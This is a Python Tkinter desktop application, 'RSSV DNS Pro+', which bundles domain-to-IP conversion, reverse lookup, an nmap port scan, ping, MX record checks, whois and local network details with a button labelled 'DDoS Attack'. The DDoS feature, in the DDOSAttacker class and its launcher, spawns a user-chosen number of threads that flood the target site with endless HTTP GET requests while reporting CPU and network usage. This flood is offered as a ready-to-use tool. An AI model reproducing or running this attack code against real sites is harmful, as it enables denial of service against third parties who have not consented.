import tkinter as tk
from tkinter import messagebox, Text, Scrollbar
import threading
import nmap
import socket
import whois
import webbrowser
import platform
import psutil
import time
import requests
import subprocess

class LoadingPopup:
    def __init__(self, root, message):
        self.root = root
        self.root.title("Loading")
        self.label = tk.Label(self.root, text=message)
        self.label.pack(padx=20, pady=20)

    def close(self):
        self.root.destroy()

class TerminalPopup:
    def __init__(self, root):
        self.root = root
        self.root.title("Terminal")

        self.text = Text(root, wrap="word", height=20, width=50)
        self.text.pack(side="left", fill="y")
        self.scrollbar = Scrollbar(root, orient="vertical", command=self.text.yview)
        self.scrollbar.pack(side="right", fill="y")
        self.text.config(yscrollcommand=self.scrollbar.set)

        self.ok_button = tk.Button(root, text="Okay", command=self.close_popup)
        self.ok_button.pack(pady=10)

    def append_output(self, text):
        self.text.insert(tk.END, text)
        self.text.see(tk.END)

    def close_popup(self):
        self.root.destroy()


class FullScreenPopup:
    def __init__(self, root, title, details):
        self.root = root
        self.root.title(title)
        self.root.geometry("1280x585")

        self.text = Text(root, wrap="word", height=20, width=80)
        self.text.pack(expand=True, fill="both", padx=20, pady=20)
        self.text.insert(tk.END, details)

        self.ok_button = tk.Button(root, text="Okay", command=self.close_popup)
        self.ok_button.pack(pady=10)

    def close_popup(self):
        self.root.destroy()


class RSSVDNSProPlus:
    def __init__(self, root):
        self.root = root
        self.root.title("RSSV DNS Pro+")

        self.label = tk.Label(self.root, text="Enter your Domain/Website:")
        self.label.pack()

        self.entry = tk.Entry(self.root)
        self.entry.pack()

        self.button = tk.Button(self.root, text="Submit", command=self.process_input)
        self.button.pack()

    def process_input(self):
        domain = self.entry.get()
        options_window = tk.Toplevel(self.root)
        options_window.title("Options")

        self.ipv4_button = tk.Button(options_window, text="Convert Domain to IPv4",
                                     command=lambda: self.domain_to_ipv4(domain))
        self.ipv4_button.pack()

        self.ipv6_button = tk.Button(options_window, text="Convert Domain to IPv6",
                                     command=lambda: self.domain_to_ipv6(domain))
        self.ipv6_button.pack()

        self.hostname_button = tk.Button(options_window, text="Convert IP to Hostname",
                                         command=lambda: self.ip_to_hostname(domain))
        self.hostname_button.pack()

        self.port_scan_button = tk.Button(options_window, text="Port Scanner",
                                          command=lambda: self.port_scanner(domain))
        self.port_scan_button.pack()

        self.ddos_button = tk.Button(options_window, text="DDoS Attack",
                                      command=lambda: self.ddos_attack(domain))
        self.ddos_button.pack()

        self.ping_button = tk.Button(options_window, text="Ping",
                                     command=lambda: self.ping(domain))
        self.ping_button.pack()

        self.mail_records_button = tk.Button(options_window, text="Mail Records",
                                             command=lambda: self.mail_checker(domain))
        self.mail_records_button.pack()

        self.view_network_button = tk.Button(options_window, text="View My Network Details",
                                             command=lambda: self.view_network_details())
        self.view_network_button.pack()

        self.whois_button = tk.Button(options_window, text="Whois Lookup",
                                       command=lambda: self.whois_lookup(domain))
        self.whois_button.pack()

        self.update_button = tk.Button(options_window, text="Check for Updates", command=self.check_for_updates)
        self.update_button.pack()

    def show_loading(self, message):
        loading_window = tk.Toplevel(self.root)
        loading_window.title("Loading")
        loading_popup = LoadingPopup(loading_window, message)
        return loading_popup

    def close_loading(self, loading_popup):
        loading_popup.close()

    def domain_to_ipv4(self, domain):
        loading_popup = self.show_loading("Converting Domain to IPv4...")
        try:
            ipv4_address = socket.gethostbyname(domain)
            self.close_loading(loading_popup)
            messagebox.showinfo("IPv4 Address", f"The IPv4 address of {domain} is: {ipv4_address}")
        except Exception as e:
            self.close_loading(loading_popup)
            messagebox.showerror("Error", f"Error: {e}")

    def domain_to_ipv6(self, domain):
        loading_popup = self.show_loading("Converting Domain to IPv6...")
        try:
            ipv6_address = socket.getaddrinfo(domain, None, socket.AF_INET6)[0][4][0]
            self.close_loading(loading_popup)
            messagebox.showinfo("IPv6 Address", f"The IPv6 address of {domain} is: {ipv6_address}")
        except socket.gaierror:
            self.close_loading(loading_popup)
            messagebox.showinfo("IPv6 Address", f"No IPv6 address found for {domain}")
        except Exception as e:
            self.close_loading(loading_popup)
            messagebox.showerror("Error", f"Error: {e}")

    def ip_to_hostname(self, ip):
        loading_popup = self.show_loading("Converting IP to Hostname...")
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            self.close_loading(loading_popup)
            messagebox.showinfo("Hostname", f"The hostname of IP address {ip} is: {hostname}")
        except Exception as e:
            self.close_loading(loading_popup)
            messagebox.showerror("Error", f"Error: {e}")

    def port_scanner(self, domain):
        loading_popup = self.show_loading("Scanning Ports...")
        def scan_ports():
            try:
                scanner = nmap.PortScanner()
                scanner.scan(domain, arguments='-T4 -F')
                open_ports = [port for host in scanner.all_hosts() for port in scanner[host]['tcp'] if
                            scanner[host]['tcp'][port]['state'] == 'open']
                self.close_loading(loading_popup)
                messagebox.showinfo("Open Ports", f"The open ports for {domain} are: {open_ports}")
            except Exception as e:
                self.close_loading(loading_popup)
                messagebox.showerror("Error", f"Error: {e}")
        threading.Thread(target=scan_ports).start()

    def ddos_attack(self, domain):
        ddos_window = tk.Toplevel(self.root)
        ddos_window.title("DDoS Attack")

        self.label = tk.Label(ddos_window, text="Enter number of threads:")
        self.label.pack()

        self.threads_entry = tk.Entry(ddos_window)
        self.threads_entry.pack()

        self.attack_button = tk.Button(ddos_window, text="Attack", command=lambda: self.start_ddos(domain))
        self.attack_button.pack()

    def start_ddos(self, domain):
        num_threads = int(self.threads_entry.get())
        terminal_window = tk.Toplevel(self.root)
        terminal_window.title("Terminal")
        terminal = TerminalPopup(terminal_window)

        ddos_attacker = DDOSAttacker(domain, num_threads, terminal)
        ddos_attacker.start_attack()

    def ping(self, domain):
        loading_popup = self.show_loading("Performing Ping...")
        def perform_ping():
            try:
                if platform.system() == "Windows":
                    ping_cmd = ["ping", "-n", "4", domain]
                else:
                    ping_cmd = ["ping", "-c", "4", domain]

                result = subprocess.run(ping_cmd, capture_output=True, text=True)
                self.close_loading(loading_popup)
                messagebox.showinfo("Ping Result", result.stdout)
            except Exception as e:
                self.close_loading(loading_popup)
                messagebox.showerror("Error", f"Error: {e}")
        threading.Thread(target=perform_ping).start()

    def mail_checker(self, domain):
        loading_popup = self.show_loading("Checking Mail Provider...")
        def check_mail():
            try:
                records = subprocess.check_output(["nslookup", "-type=mx", domain, "1.1.1.1"]).decode("utf-8")
                self.close_loading(loading_popup)
                if "google.com" in records:
                    messagebox.showinfo("Mail Provider", "Mail provider for {} is Google.".format(domain))
                elif "microsoft.com" in records:
                    messagebox.showinfo("Mail Provider", "Mail provider for {} is Microsoft.".format(domain))
                elif "zoho.com" in records:
                    messagebox.showinfo("Mail Provider", "Mail provider for {} is Zoho.".format(domain))
                else:
                    messagebox.showinfo("Mail Provider", f"Custom mail provider for {domain}: {records}")
            except Exception as e:
                self.close_loading(loading_popup)
                messagebox.showerror("Error", f"Error: {e}")
        threading.Thread(target=check_mail).start()

    def view_network_details(self):
        details = []
        try:
            ipconfig_info = subprocess.check_output(["ipconfig", "/all"]).decode("utf-8")
            details.append(ipconfig_info)
        except subprocess.CalledProcessError:
            details.append("Failed to retrieve network details.")

        network_window = tk.Toplevel(self.root)
        network_window.title("Network Details")
        network_popup = FullScreenPopup(network_window, "Network Details", "\n".join(details))

    def whois_lookup(self, domain):
        loading_popup = self.show_loading("Performing Whois Lookup...")
        def perform_whois():
            try:
                whois_info = whois.whois(domain)
                whois_popup = tk.Toplevel(self.root)
                whois_popup.title("Whois Lookup")
                terminal = TerminalPopup(whois_popup)
                terminal.append_output(str(whois_info))
                self.close_loading(loading_popup)
            except Exception as e:
                self.close_loading(loading_popup)
                messagebox.showerror("Error", f"Error: {e}")

        threading.Thread(target=perform_whois).start()

    def check_for_updates(self):
        webbrowser.open("https://shravanprojects.github.io/rssvdnspro/")


class DDOSAttacker:
    def __init__(self, website, num_threads, terminal):
        self.website = website
        self.num_threads = num_threads
        self.terminal = terminal

    def start_attack(self):
        self.terminal.append_output("Starting DDoS Attack...\n")
        try:
            for _ in range(self.num_threads):
                threading.Thread(target=self.ddos_attack_thread).start()
            t = threading.Thread(target=self.monitor_usage)
            t.start()
        except Exception as e:
            self.terminal.append_output(f"Error: {e}\n")

    def ddos_attack_thread(self):
        while True:
            try:
                requests.get("http://" + self.website)
                self.terminal.append_output("Request sent\n")
            except:
                self.terminal.append_output("Error sending request\n")

    def monitor_usage(self):
        while True:
            net_usage = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
            cpu_usage = psutil.cpu_percent()
            memory_usage = psutil.virtual_memory().percent

            self.terminal.append_output(f"Network Usage: {net_usage} bytes\n")
            self.terminal.append_output(f"CPU Usage: {cpu_usage}%\n")
            self.terminal.append_output(f"Memory Usage: {memory_usage}%\n")

            time.sleep(2)


if __name__ == "__main__":
    root = tk.Tk()
    app = RSSVDNSProPlus(root)
    root.mainloop()
